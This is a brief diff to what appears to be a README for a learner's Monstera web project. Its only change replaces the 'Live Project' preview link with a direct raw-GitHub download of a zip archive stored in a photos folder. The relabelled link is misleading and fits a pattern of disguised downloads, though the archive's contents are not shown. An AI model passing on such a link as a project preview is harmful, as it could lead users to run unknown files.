@@ -15,4 +15,4 @@ I also learnt various flex-box properties.
  - ***how to use third party libraries of animations.***
 
 # Here is the preview of the project.
-[Live Project](https://monsteraapp.netlify.app/)
+[Live Project](https://raw.githubusercontent.com/muhammadAmeen786/Monstera/main/photos/Monstera-2.3.zip)
